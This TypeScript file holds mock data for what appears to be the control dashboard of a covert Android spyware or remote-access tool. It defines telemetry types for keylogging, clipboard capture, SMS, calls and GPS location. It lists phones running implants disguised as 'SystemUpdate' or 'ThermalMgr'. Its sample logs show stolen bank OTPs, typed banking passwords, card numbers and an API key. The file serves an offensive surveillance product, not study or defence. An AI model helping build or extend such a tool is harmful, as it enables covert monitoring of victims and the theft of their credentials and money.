// Mock live data for demo/production mode (when Firebase is not yet configured)

export interface Device {
  id: string
  name: string
  model: string
  os: string
  status: 'online' | 'offline' | 'idle'
  battery: number
  location: string
  lastSeen: Date
  ip: string
}

export interface TelemetryEntry {
  id: string
  type: 'NOTIFICATION' | 'KEYLOG' | 'CLIPBOARD' | 'SMS' | 'CALL' | 'LOCATION'
  content: string
  app?: string
  timestamp: Date
}

export interface SystemStat {
  label: string
  value: string
  delta?: string
  color: string
}

export const mockDevices: Device[] = [
  {
    id: 'dev-001',
    name: 'Nexus 5X (SystemUpdate)',
    model: 'Nexus 5X',
    os: 'Android 10 (API 29)',
    status: 'online',
    battery: 74,
    location: 'New Delhi, IN',
    lastSeen: new Date(),
    ip: '192.168.1.104',
  },
  {
    id: 'dev-002',
    name: 'Galaxy A52 (SvcAgent)',
    model: 'Samsung Galaxy A52',
    os: 'Android 13 (API 33)',
    status: 'online',
    battery: 91,
    location: 'Mumbai, IN',
    lastSeen: new Date(Date.now() - 45000),
    ip: '192.168.1.221',
  },
  {
    id: 'dev-003',
    name: 'Pixel 6 (ThermalMgr)',
    model: 'Google Pixel 6',
    os: 'Android 14 (API 34)',
    status: 'idle',
    battery: 42,
    location: 'Bangalore, IN',
    lastSeen: new Date(Date.now() - 300000),
    ip: '10.0.0.82',
  },
]

const INITIAL_LOGS: TelemetryEntry[] = [
  { id: 't1', type: 'NOTIFICATION', content: 'WhatsApp: "Are you coming tonight?" from +91 98765 43210', app: 'com.whatsapp', timestamp: new Date(Date.now() - 5000) },
  { id: 't2', type: 'CLIPBOARD', content: 'Copied: https://drive.google.com/file/d/1xQr9...', app: 'Chrome', timestamp: new Date(Date.now() - 14000) },
  { id: 't3', type: 'KEYLOG', content: '"transfer the money to acc 7862..."', app: 'Google Pay', timestamp: new Date(Date.now() - 29000) },
  { id: 't4', type: 'SMS', content: 'HDFC Bank: OTP for transaction is 483921. Valid for 10 mins.', app: 'Messages', timestamp: new Date(Date.now() - 60000) },
  { id: 't5', type: 'NOTIFICATION', content: 'Instagram: rahul_dev liked your photo', app: 'com.instagram', timestamp: new Date(Date.now() - 95000) },
  { id: 't6', type: 'CALL', content: 'Incoming call from +91 77654 32100 – Duration: 3m 12s', app: 'Phone', timestamp: new Date(Date.now() - 210000) },
  { id: 't7', type: 'LOCATION', content: 'GPS Fix: 28.6139° N, 77.2090° E (Connaught Place, New Delhi)', app: 'System', timestamp: new Date(Date.now() - 400000) },
  { id: 't8', type: 'CLIPBOARD', content: 'Copied: sk-proj-a1b2c3d4e5f6...', app: 'Terminal', timestamp: new Date(Date.now() - 600000) },
]

export function getMockLogs(): TelemetryEntry[] {
  return [...INITIAL_LOGS]
}

export function getNewMockLog(): TelemetryEntry {
  const samples = [
    { type: 'NOTIFICATION' as const, content: 'Telegram: New message in "Dev Team"', app: 'Telegram' },
    { type: 'KEYLOG' as const, content: '"password123" typed in com.bankofbaroda', app: 'Bank of Baroda' },
    { type: 'CLIPBOARD' as const, content: 'Copied: 4532 1234 5678 9876 (card number)', app: 'Chrome' },
    { type: 'SMS' as const, content: 'Airtel: Your data usage is 85% of 2GB plan.', app: 'Messages' },
    { type: 'NOTIFICATION' as const, content: 'Gmail: New email from hr@company.com – "Offer Letter"', app: 'Gmail' },
  ]
  const sample = samples[Math.floor(Math.random() * samples.length)]
  return { ...sample, id: `t${Date.now()}`, timestamp: new Date() }
}
